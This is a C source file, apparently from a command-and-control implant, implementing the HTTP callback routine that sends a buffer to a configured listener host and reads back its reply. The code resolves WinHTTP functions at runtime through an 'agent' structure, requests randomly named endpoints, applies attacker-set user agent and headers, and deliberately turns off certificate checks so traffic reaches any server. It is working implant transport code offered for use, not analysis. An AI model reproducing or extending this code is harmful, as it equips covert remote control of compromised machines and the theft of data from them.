#include "Http.h"
#include "localcstd.h"

BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) {
	HINTERNET hConnect = NULL;
	HANDLE hRequest = NULL;
	
	DWORD HTTP_FLAGS = 0;
	LPWSTR HttpEndpoint = { 0 };
	PVOID RespBuffer = { 0 };
	BYTE TempBuffer[1024] = { 0 };
	DWORD BytesRead = 0;
	SIZE_T TotalBytesAdded = 0;
	BOOL Success = FALSE;
	

	HINTERNET hSession = agent->apis->pWinHttpOpen(agent->config->listenerConfig->UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	if (!hSession) {
		printf("[!] Failure to create http session token: [%08x]\n", GetLastError());
		goto EXIT;
	}
	HTTP_FLAGS = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
	HttpEndpoint = generateRandomStringW(10);

	if (agent->config->listenerConfig->Secure)
	{
		if (!(hConnect = agent->apis->pWinHttpConnect(hSession, agent->config->listenerConfig->CurrentHost->Host, INTERNET_DEFAULT_HTTPS_PORT, 0))) {
			printf("[!] Failure to connect to http server: [%08x]\n", GetLastError());
			goto EXIT;
		}

		HTTP_FLAGS |= WINHTTP_FLAG_SECURE;

		if (!(hRequest = agent->apis->pWinHttpOpenRequest(hConnect,(LPCWSTR) agent->config->listenerConfig->Method, HttpEndpoint, NULL, NULL, NULL, HTTP_FLAGS))) {
			printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", "RegisterAgent", GetLastError());
			goto EXIT;
		}

		HTTP_FLAGS = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

		if (!agent->apis->pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HTTP_FLAGS, sizeof(DWORD)))
		{
			printf("[!] Failure to set HTTP OPTIONS => [%08x]", GetLastError());
			goto EXIT;
		}
	}
	
	else {
		if (!(hConnect = agent->apis->pWinHttpConnect(hSession, agent->config->listenerConfig->CurrentHost->Host, INTERNET_DEFAULT_HTTP_PORT, 0))) {
			printf("[!] Failure to connect to http server: [%08x]\n", GetLastError());
			goto EXIT;
		}
		if (!(hRequest = agent->apis->pWinHttpOpenRequest(hConnect, agent->config->listenerConfig->Method, generateRandomStringW(10), NULL, NULL, NULL, 0))) {
			printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", "RegisterAgent", GetLastError());
			goto EXIT;
		}
	}
	
	
	int index = 0;
	while (agent->config->listenerConfig->Headers[index] != NULL) {
		if (!agent->apis->pWinHttpAddRequestHeaders(hRequest, agent->config->listenerConfig->Headers[index], -1, WINHTTP_ADDREQ_FLAG_ADD)) {
			printf("[!] Failure to add request headers [%ls]\n", agent->config->listenerConfig->Headers[index]);
		}
		index++;
	}
	if (agent->apis->pWinHttpSendRequest(hRequest, NULL, 0, (LPVOID)Buffer, BufferLength, BufferLength, 0))
	{
		if (agent->apis->pWinHttpReceiveResponse(hRequest, NULL))
		{
			DWORD StatusCode = 0;
			DWORD StatusSize = sizeof(DWORD);

			if (!agent->apis->pWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
				WINHTTP_HEADER_NAME_BY_INDEX,
				&StatusCode,
				&StatusSize,
				WINHTTP_NO_HEADER_INDEX)) {
				printf("[!] Failure to query status code [%d]\n", StatusCode);
				goto EXIT;
			}

			if (StatusCode != HTTP_STATUS_OK) {
				printf("[!] Failure to perform request [%d]\n", StatusCode);
				goto EXIT;
			}

			if (Response)
			{
				RespBuffer = NULL;

				do
				{
					Success = agent->apis->pWinHttpReadData(hRequest, TempBuffer, sizeof(TempBuffer), &BytesRead);
					if (!Success || BytesRead == 0) {
						break;
					}

					if (!RespBuffer)
					{
						RespBuffer = agent->apis->pLocalAlloc(LPTR, BytesRead);
					}
					else {
						RespBuffer = agent->apis->pLocalReAlloc(RespBuffer, TotalBytesAdded + BytesRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
					}
					MemoryCopy((BYTE*)((SIZE_T)RespBuffer + TotalBytesAdded), TempBuffer, BytesRead);
					MemorySet(TempBuffer, 0, sizeof(TempBuffer));
					TotalBytesAdded += BytesRead;

				} while (Success == TRUE);

				Response->Buffer = RespBuffer;
				Response->BufferLength = TotalBytesAdded;
				Success = TRUE;
				goto EXIT;
			}
			else { // no response needed. Uusally for metadata requests. 
				Success = TRUE;
				goto EXIT;
			}
		}
		else {
			printf("[!] Failure to receive response: [%08x]\n", GetLastError());
			goto EXIT;
	
		}
	}
	else {
		printf("Error sending request: [%08x]\n", GetLastError());
		goto EXIT;
	}
EXIT:
	if (hRequest) {
		agent->apis->pWinHttpCloseHandle(hRequest);
	}
	if (hConnect) {
		agent->apis->pWinHttpCloseHandle(hConnect);
	}
	if (hSession) {
		agent->apis->pWinHttpCloseHandle(hSession);
	}

	return Success;
}